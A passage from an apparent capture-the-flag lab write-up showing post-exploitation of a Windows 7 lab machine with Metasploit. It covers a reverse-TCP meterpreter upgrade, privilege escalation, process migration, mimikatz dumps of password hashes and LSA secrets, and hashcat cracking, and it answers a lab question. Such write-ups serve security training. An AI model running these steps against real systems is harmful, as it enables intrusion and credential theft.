</span></span><span style=display:flex><span>  <span style=color:#ae81ff>1</span>         shell x64/windows  Microsoft Windows <span style=color:#f92672>[</span>Version 6.1.7601<span style=color:#f92672>]</span> Copyright <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2009</span> Microsoft Corporation...  10.8.11.158:4444 -&gt; 10.10.223.243:49187 <span style=color:#f92672>(</span>10.10.223.243<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; set SESSION <span style=color:#ae81ff>1</span> 
</span></span><span style=display:flex><span>SESSION <span style=color:#f92672>=</span>&gt; <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; run
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Upgrading session ID: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting exploit/multi/handler
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 10.8.11.158:4433 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Post module execution completed
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>180291</span> bytes<span style=color:#f92672>)</span> to 10.10.223.243
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>2</span> opened <span style=color:#f92672>(</span>10.8.11.158:4433 -&gt; 10.10.223.243:49197<span style=color:#f92672>)</span> at 2020-03-20 11:57:43 +0100
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Stopping exploit/multi/handler
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; show sessions
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Active sessions
</span></span><span style=display:flex><span><span style=color:#f92672>===============</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  Id  Name  Type                     Information                                                                       Connection
</span></span><span style=display:flex><span>  --  ----  ----                     -----------                                                                       ----------
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>1</span>         shell x64/windows        Microsoft Windows <span style=color:#f92672>[</span>Version 6.1.7601<span style=color:#f92672>]</span> Copyright <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2009</span> Microsoft Corporation...  10.8.11.158:4444 -&gt; 10.10.223.243:49187 <span style=color:#f92672>(</span>10.10.223.243<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>2</span>         meterpreter x86/windows  NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM @ JON-PC                                                      10.8.11.158:4433 -&gt; 10.10.223.243:49197 <span style=color:#f92672>(</span>10.10.223.243<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Migrating shell to meterpreter was successful, so we have 2 sessions now. Let&rsquo;s run the second one, the meterpreter session
and migrate process to another process id.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; sessions <span style=color:#ae81ff>2</span>                                                                                                     
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting interaction with 2...                                                                                                                            
</span></span><span style=display:flex><span>                                                                                                                                                              
</span></span><span style=display:flex><span>meterpreter &gt; getsystem                                                                                                                                       
</span></span><span style=display:flex><span>...got system via technique <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>Named Pipe Impersonation <span style=color:#f92672>(</span>In Memory/Admin<span style=color:#f92672>))</span>.
</span></span><span style=display:flex><span>meterpreter &gt; ps                                                                                                                                              
</span></span><span style=display:flex><span>                                                                                                                                                              
</span></span><span style=display:flex><span>Process List                                                                                                                                                  
</span></span><span style=display:flex><span><span style=color:#f92672>============</span>                                                                                                                                                  
</span></span><span style=display:flex><span>                                                                                                                                                              
</span></span><span style=display:flex><span> PID   PPID  Name                  Arch  Session  User                          Path                                                                          
</span></span><span style=display:flex><span> ---   ----  ----                  ----  -------  ----                          ----                                                                          
</span></span><span style=display:flex><span> <span style=color:#ae81ff>0</span>     <span style=color:#ae81ff>0</span>     <span style=color:#f92672>[</span>System Process<span style=color:#f92672>]</span>                                                                                                                                 
</span></span><span style=display:flex><span> <span style=color:#ae81ff>4</span>     <span style=color:#ae81ff>0</span>     System                x64   <span style=color:#ae81ff>0</span>                                                                                                                    
</span></span><span style=display:flex><span> <span style=color:#ae81ff>416</span>   <span style=color:#ae81ff>4</span>     smss.exe              x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\s</span>mss.exe                                                  
</span></span><span style=display:flex><span> <span style=color:#ae81ff>428</span>   <span style=color:#ae81ff>712</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\s</span>vchost.exe                                               
</span></span><span style=display:flex><span> <span style=color:#ae81ff>560</span>   <span style=color:#ae81ff>564</span>   conhost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\c</span>onhost.exe                                               
</span></span><span style=display:flex><span> <span style=color:#ae81ff>564</span>   <span style=color:#ae81ff>556</span>   csrss.exe             x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\c</span>srss.exe                                                 
</span></span><span style=display:flex><span> <span style=color:#ae81ff>612</span>   <span style=color:#ae81ff>556</span>   wininit.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\w</span>ininit.exe                                               
</span></span><span style=display:flex><span> <span style=color:#ae81ff>624</span>   <span style=color:#ae81ff>604</span>   csrss.exe             x64   <span style=color:#ae81ff>1</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\c</span>srss.exe                                                 
</span></span><span style=display:flex><span> <span style=color:#ae81ff>664</span>   <span style=color:#ae81ff>604</span>   winlogon.exe          x64   <span style=color:#ae81ff>1</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\w</span>inlogon.exe                                              
</span></span><span style=display:flex><span> <span style=color:#ae81ff>712</span>   <span style=color:#ae81ff>612</span>   services.exe          x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\s</span>ervices.exe                                              
</span></span><span style=display:flex><span> <span style=color:#ae81ff>720</span>   <span style=color:#ae81ff>612</span>   lsass.exe             x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\l</span>sass.exe                                                 
</span></span><span style=display:flex><span> <span style=color:#ae81ff>724</span>   <span style=color:#ae81ff>712</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\s</span>vchost.exe                                               
</span></span><span style=display:flex><span> <span style=color:#ae81ff>728</span>   <span style=color:#ae81ff>612</span>   lsm.exe               x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\l</span>sm.exe                                                   
</span></span><span style=display:flex><span> <span style=color:#ae81ff>836</span>   <span style=color:#ae81ff>712</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\s</span>vchost.exe                                               
</span></span><span style=display:flex><span> <span style=color:#ae81ff>904</span>   <span style=color:#ae81ff>712</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\N</span>ETWORK SERVICE  C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\s</span>vchost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>952</span>   <span style=color:#ae81ff>712</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\L</span>OCAL SERVICE    C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\s</span>vchost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1020</span>  <span style=color:#ae81ff>664</span>   LogonUI.exe           x64   <span style=color:#ae81ff>1</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\L</span>ogonUI.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1128</span>  <span style=color:#ae81ff>712</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\L</span>OCAL SERVICE    C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\s</span>vchost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1184</span>  <span style=color:#ae81ff>1348</span>  cmd.exe               x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\c</span>md.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1204</span>  <span style=color:#ae81ff>712</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\N</span>ETWORK SERVICE  C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\s</span>vchost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1348</span>  <span style=color:#ae81ff>712</span>   spoolsv.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\s</span>poolsv.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1384</span>  <span style=color:#ae81ff>712</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\L</span>OCAL SERVICE    C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\s</span>vchost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1448</span>  <span style=color:#ae81ff>712</span>   amazon-ssm-agent.exe  x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\P</span>rogram Files<span style=color:#ae81ff>\A</span>mazon<span style=color:#ae81ff>\S</span>SM<span style=color:#ae81ff>\a</span>mazon-ssm-agent.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1524</span>  <span style=color:#ae81ff>712</span>   LiteAgent.exe         x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\P</span>rogram Files<span style=color:#ae81ff>\A</span>mazon<span style=color:#ae81ff>\X</span>entools<span style=color:#ae81ff>\L</span>iteAgent.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1664</span>  <span style=color:#ae81ff>712</span>   Ec2Config.exe         x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\P</span>rogram Files<span style=color:#ae81ff>\A</span>mazon<span style=color:#ae81ff>\E</span>c2ConfigService<span style=color:#ae81ff>\E</span>c2Config.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1996</span>  <span style=color:#ae81ff>712</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\N</span>ETWORK SERVICE  C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\s</span>vchost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2084</span>  <span style=color:#ae81ff>712</span>   sppsvc.exe            x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\N</span>ETWORK SERVICE  C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\s</span>ppsvc.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2240</span>  <span style=color:#ae81ff>2920</span>  powershell.exe        x86   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>yswow64<span style=color:#ae81ff>\W</span>indowsPowerShell<span style=color:#ae81ff>\v</span>1.0<span style=color:#ae81ff>\p</span>owershell.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2368</span>  <span style=color:#ae81ff>2240</span>  cmd.exe               x86   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ysWOW64<span style=color:#ae81ff>\c</span>md.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2396</span>  <span style=color:#ae81ff>564</span>   conhost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\c</span>onhost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2404</span>  <span style=color:#ae81ff>712</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\L</span>OCAL SERVICE    C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\s</span>vchost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2556</span>  <span style=color:#ae81ff>564</span>   conhost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\c</span>onhost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2572</span>  <span style=color:#ae81ff>712</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\s</span>vchost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2604</span>  <span style=color:#ae81ff>712</span>   vds.exe               x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\v</span>ds.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2716</span>  <span style=color:#ae81ff>712</span>   SearchIndexer.exe     x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\S</span>earchIndexer.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2916</span>  <span style=color:#ae81ff>564</span>   conhost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\c</span>onhost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2920</span>  <span style=color:#ae81ff>2400</span>  powershell.exe        x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\W</span>indowsPowerShell<span style=color:#ae81ff>\v</span>1.0<span style=color:#ae81ff>\p</span>owershell.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2996</span>  <span style=color:#ae81ff>2240</span>  cmd.exe               x86   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ysWOW64<span style=color:#ae81ff>\c</span>md.exe
</span></span><span style=display:flex><span>meterpreter &gt; migrate <span style=color:#ae81ff>712</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Migrating from <span style=color:#ae81ff>2240</span> to 712...
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Migration completed successfully.
</span></span></code></pre></div><p>Yeah, migration was succesful, so we can dump the hashes of users passwords.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; hashdump
</span></span><span style=display:flex><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
</span></span><span style=display:flex><span>meterpreter &gt; load kiwi
</span></span><span style=display:flex><span>Loading extension kiwi...
</span></span><span style=display:flex><span>  .#####.   mimikatz 2.2.0 <span style=color:#ae81ff>20191125</span> <span style=color:#f92672>(</span>x64/windows<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> .## ^ <span style=color:#75715e>##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)</span>
</span></span><span style=display:flex><span> <span style=color:#75715e>## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
</span></span><span style=display:flex><span> <span style=color:#75715e>## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
</span></span><span style=display:flex><span> <span style=color:#e6db74>&#39;## v ##&#39;</span>        Vincent LE TOUX            <span style=color:#f92672>(</span> vincent.letoux@gmail.com <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;#####&#39;</span>         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Success.
</span></span><span style=display:flex><span>meterpreter &gt; lsa_dump_sam 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Running as SYSTEM
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Dumping SAM
</span></span><span style=display:flex><span>Domain : JON-PC
</span></span><span style=display:flex><span>SysKey : 55bd17830e678f18a3110daf2c17d4c7
</span></span><span style=display:flex><span>Local SID : S-1-5-21-2633577515-2458672280-487782642
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>SAMKey : c74ee832c5b6f4030dbbc7b51a011b1e
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>RID  : 000001f4 <span style=color:#f92672>(</span>500<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>User : Administrator
</span></span><span style=display:flex><span>  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>RID  : 000001f5 <span style=color:#f92672>(</span>501<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>User : Guest
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>RID  : 000003e8 <span style=color:#f92672>(</span>1000<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>User : Jon
</span></span><span style=display:flex><span>  Hash NTLM: ffb43f0de35be4d9917ac0cc8ad57f8d
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter &gt; lsa_dump_secrets 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Running as SYSTEM
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Dumping LSA secrets
</span></span><span style=display:flex><span>Domain : JON-PC
</span></span><span style=display:flex><span>SysKey : 55bd17830e678f18a3110daf2c17d4c7
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Local name : Jon-PC <span style=color:#f92672>(</span> S-1-5-21-2633577515-2458672280-487782642 <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Domain name : WORKGROUP
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Policy subsystem is : 1.11
</span></span><span style=display:flex><span>LSA Key<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span> : 1, default <span style=color:#f92672>{</span>888e8eec-afc6-d204-0da2-a847caf129ea<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>[</span>00<span style=color:#f92672>]</span> <span style=color:#f92672>{</span>888e8eec-afc6-d204-0da2-a847caf129ea<span style=color:#f92672>}</span> c3c1bfae498011d6dd37f2710cc970a5e2d80f0e17e6c12237abaaceed8ce04f
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Secret  : DefaultPassword
</span></span><span style=display:flex><span>old/text: CDCClubROX
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Secret  : DPAPI_SYSTEM
</span></span><span style=display:flex><span>cur/hex : <span style=color:#ae81ff>01</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> dc <span style=color:#ae81ff>31</span> ac <span style=color:#ae81ff>35</span> e1 9a <span style=color:#ae81ff>18</span> b0 0b 5b <span style=color:#ae81ff>06</span> 6d e3 e8 da <span style=color:#ae81ff>89</span> 8b f8 da <span style=color:#ae81ff>71</span> fa ea <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>03</span> f4 2b <span style=color:#ae81ff>58</span> e1 a5 dd <span style=color:#ae81ff>35</span> ee <span style=color:#ae81ff>81</span> <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>85</span> a9 <span style=color:#ae81ff>53</span> b1 c7 <span style=color:#ae81ff>95</span> 
</span></span><span style=display:flex><span>    full: dc31ac35e19a18b00b5b066de3e8da898bf8da71faea7403f42b58e1a5dd35ee816185a953b1c795
</span></span><span style=display:flex><span>    m/u : dc31ac35e19a18b00b5b066de3e8da898bf8da71 / faea7403f42b58e1a5dd35ee816185a953b1c795
</span></span><span style=display:flex><span>old/hex : <span style=color:#ae81ff>01</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> c9 <span style=color:#ae81ff>22</span> d6 0b <span style=color:#ae81ff>83</span> 9e dd <span style=color:#ae81ff>98</span> a7 ad 7a 5a c5 ff 4e bb 8a d2 6f <span style=color:#ae81ff>01</span> <span style=color:#ae81ff>61</span> be bf d4 bc <span style=color:#ae81ff>70</span> <span style=color:#ae81ff>54</span> <span style=color:#ae81ff>70</span> fd df <span style=color:#ae81ff>46</span> <span style=color:#ae81ff>12</span> a8 c5 e5 2d <span style=color:#ae81ff>98</span> 6c <span style=color:#ae81ff>79</span> <span style=color:#ae81ff>71</span> 
</span></span><span style=display:flex><span>    full: c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f0161bebfd4bc705470fddf4612a8c5e52d986c7971
</span></span><span style=display:flex><span>    m/u : c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f01 / 61bebfd4bc705470fddf4612a8c5e52d986c7971
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Secret  : NL$KM
</span></span><span style=display:flex><span>cur/hex : <span style=color:#ae81ff>45</span> <span style=color:#ae81ff>94</span> 4a <span style=color:#ae81ff>93</span> a2 9d d2 8e 2b cf 5f df <span style=color:#ae81ff>66</span> <span style=color:#ae81ff>75</span> <span style=color:#ae81ff>59</span> 4c e9 bc b8 <span style=color:#ae81ff>91</span> 2c <span style=color:#ae81ff>66</span> <span style=color:#ae81ff>59</span> 1e bf <span style=color:#ae81ff>53</span> 1e <span style=color:#ae81ff>77</span> be c2 9b <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>04</span> b4 <span style=color:#ae81ff>56</span> ea 7d 6f ba c2 1b 7e f0 ba <span style=color:#ae81ff>53</span> <span style=color:#ae81ff>67</span> e6 e6 <span style=color:#ae81ff>66</span> <span style=color:#ae81ff>84</span> <span style=color:#ae81ff>95</span> 1f <span style=color:#ae81ff>90</span> <span style=color:#ae81ff>60</span> <span style=color:#ae81ff>42</span> ee <span style=color:#ae81ff>34</span> 0a ee <span style=color:#ae81ff>99</span> 9f <span style=color:#ae81ff>55</span> 
</span></span></code></pre></div><p><strong>Within our elevated meterpreter shell, run the command &lsquo;hashdump&rsquo;. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?</strong></p><ul><li>Jon</li></ul><p>Now we can crack the hashes. It doesn&rsquo;t care if we use <a href=https://www.openwall.com/john/>john-the-ripper</a> or <a href=https://hashcat.net/hashcat/>hashcat</a>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ echo <span style=color:#e6db74>&#39;ffb43f0de35be4d9917ac0cc8ad57f8d&#39;</span> &gt; hashes.txt
</span></span><span style=display:flex><span>$ hashcat -m <span style=color:#ae81ff>1000</span> -O hashes.txt /usr/local/share/wordlists/rockyou.txt
</span></span><span style=display:flex><span>Dictionary cache hit:                                                                    
</span></span><span style=display:flex><span>* Filename..: /usr/local/share/wordlists/rockyou.txt                                     
</span></span><span style=display:flex><span>* Passwords.: <span style=color:#ae81ff>14344384</span>                                                                   
</span></span><span style=display:flex><span>* Bytes.....: <span style=color:#ae81ff>139921497</span>                                                                                                                                                           
</span></span><span style=display:flex><span>* Keyspace..: <span style=color:#ae81ff>14344384</span>                                                                                                                                                            
</span></span><span style=display:flex><span>                                                                                                                                                                                  ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22                                                
</span></span><span style=display:flex><span>                                                                                                                                                                                  
</span></span><span style=display:flex><span>Session..........: hashcat                                                                                                                                                        
</span></span><span style=display:flex><span>Status...........: Cracked
</span></span><span style=display:flex><span>Hash.Type........: NTLM
</span></span><span style=display:flex><span>Hash.Target......: ffb43f0de35be4d9917ac0cc8ad57f8d
</span></span><span style=display:flex><span>Time.Started.....: Fri Mar <span style=color:#ae81ff>20</span> 16:12:30 <span style=color:#ae81ff>2020</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>3</span> secs<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Time.Estimated...: Fri Mar <span style=color:#ae81ff>20</span> 16:12:33 <span style=color:#ae81ff>2020</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>0</span> secs<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Guess.Base.......: File <span style=color:#f92672>(</span>/usr/local/share/wordlists/rockyou.txt<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Guess.Queue......: 1/1 <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span>
